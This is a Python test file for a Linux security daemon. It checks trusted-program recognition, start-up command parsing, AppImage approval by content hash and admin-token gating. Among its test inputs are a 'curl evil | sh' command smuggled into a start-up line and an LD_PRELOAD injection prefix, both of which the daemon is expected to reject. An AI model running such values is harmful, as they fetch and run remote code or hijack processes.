"""Trust: Dukiwi applications recognised out of the box (2.7.7), AppImages approved by content (2.7.9)."""
import os
import time
import re

import _harness as h

R = h.Results("Trust")
d = h.daemon_module()

# ── Dukiwi applications ──
r = {p: d.dukiwi_program(p) for p in ("/home/someone/bin/dukiwilink-agent", "/usr/bin/dukiwilink-missing-xyz", "/usr/bin/bash")}
R.check("not a Dukiwi program: in a home folder, missing, or another path", not any(r.values()), r)
fake = os.path.join(h.home_tmpdir("trust"), "dukiwilink-agent")
open(fake, "w").write("#!/bin/sh\n")
os.chmod(fake, 0o755)
saved = d.DUKIWI_PROGRAMS
d.DUKIWI_PROGRAMS = saved + (fake,)
R.check("a known path is not enough: the file must belong to root and not be writable by others", not d.dukiwi_program(fake))
d.DUKIWI_PROGRAMS = saved
installed = [p for p in ("/usr/bin/dukiwi-shield", "/opt/dukiwi-shield/dukiwi-shield-daemon.py", "/usr/bin/dukiwilink-agent",
                         "/opt/gleeder-linux-manager-agent/agent.sh", "/usr/bin/openvpn-gui") if os.path.exists(p)]
if installed:
    dm = object.__new__(d.Daemon)
    dm.central_patterns = []
    # Trusted only where nobody but root can have put them: on a machine where /opt belongs to a user, the
    # programs under /opt are (rightly) not trusted
    safe = [p for p in installed if d.root_owned_chain(p)]
    R.check("installed Dukiwi programs are trusted by the service without the central allowlist (root's folders only)",
            all(dm.central_trusted(p) for p in safe) and not any(dm.central_trusted(p) for p in installed if p not in safe)
            and not dm.central_trusted("/usr/bin/evil-xyz"), (safe, installed))
else:
    R.skip("installed Dukiwi programs are trusted", "no Dukiwi program installed here")
cases = {'"/usr/bin/dukiwilink-agent"': "/usr/bin/dukiwilink-agent", "/usr/bin/dukiwilink-agent --tray %U": "/usr/bin/dukiwilink-agent",
         "sh -c '/usr/bin/dukiwilink-agent; curl evil | sh'": "", "/bin/sh -c /usr/bin/dukiwilink-agent": "/bin/sh",
         "env LD_PRELOAD=/tmp/x.so /usr/bin/dukiwilink-agent": "", 'broken "quote': ""}
got = {k: d.startup_program("autostart", "/nonexistent.desktop", k) for k in cases}
unit = os.path.join(h.tmpdir("unit"), "x.service")
open(unit, "w").write("[Service]\nExecStartPre=/bin/true\nExecStart=-/opt/gleeder-linux-manager-agent/agent.sh --daemon\n")
R.check("start-up command: first word only; shell wrappers and env prefixes are not the Dukiwi program",
        got == cases and d.startup_program("system_unit", unit) == "/opt/gleeder-linux-manager-agent/agent.sh",
        {k: v for k, v in got.items() if v != cases[k]})

# ── AppImage: approval by content ──
base = h.tmpdir("appimage")
d.APPIMAGE_MOUNT_RE = re.compile("^" + re.escape(base) + r"/\.mount_[^/]+/")      # /tmp/.mount_* in the real service
for m, data in (("kDriveAAAAAA", b"kdrive v1"), ("kDriveBBBBBB", b"kdrive v1"), ("kDriveEVILXX", b"other content")):
    os.makedirs(f"{base}/.mount_{m}/usr/bin")
    open(f"{base}/.mount_{m}/usr/bin/kDrive", "wb").write(data)
first, second, evil = (f"{base}/.mount_{m}/usr/bin/kDrive" for m in ("kDriveAAAAAA", "kDriveBBBBBB", "kDriveEVILXX"))
dm = object.__new__(d.Daemon)
dm.state, dm._trusted_set, dm.suspended, dm.unlocked = h.St(trusted_programs=[]), d.TrustedPrograms([]), {}, {}
dm.write_log = dm.broadcast = lambda *a: None
dm.refresh_overall = dm._builtin_refresh = lambda: None
dm.connections = type("C", (), {"mark_trusted": lambda self, e: None})()
dm.settings = type("S", (), {"get": lambda self, k: None})()
dm.monitor = type("M", (), {"dpkg_cache": {}})()
R.check("trusting a program needs the administrator (any program of the account could otherwise trust itself)",
        dm.handle({"cmd": "trust_program", "exe": first, "comm": "kDrive"}, os.getuid()).get("error") == "admin_required")
dm.unlocked = {os.getuid(): (time.time() + 60, "tok")}
R.check("an unlock is only valid with its token", not dm.is_unlocked(os.getuid(), {}) and not dm.is_unlocked(os.getuid(), {"admin_token": "bad"}))
r = dm.handle({"cmd": "trust_program", "exe": first, "comm": "kDrive", "admin_token": "tok"}, os.getuid())
entry = (dm.state.get("trusted_programs") or [{}])[0]
R.check("trusting a program of an AppImage stores its content hash", r.get("ok") and entry.get("kind") == "appimage" and len(entry.get("sha256", "")) == 64, (r, entry))
t = dm.user_trusted()
R.check("the same program from the next launch (new mount folder) is trusted; other content is not",
        first in t and second in t and evil not in t, (first in t, second in t, evil in t))
u = dm.handle({"cmd": "untrust_program", "exe": first}, os.getuid())
R.check("removing it withdraws the trust for every launch", u.get("ok") and second not in dm.user_trusted())

# ── at startup: old approvals of a vanished mount are removed ──
state = {"trusted_programs": [{"exe": "/tmp/.mount_kDriveGONE00/usr/bin/kDrive", "comm": "kDrive"}, {"exe": "/home/x/.steam/steam", "comm": "steam"}]}
with h.TestDaemon(state=state, tag="prune") as srv:
    progs = [p["exe"] for p in srv.request("trusted_programs").get("programs") or []]
R.check("startup removes approvals of AppImage mounts that no longer exist, keeps the others", progs == ["/home/x/.steam/steam"], progs)
R.done()
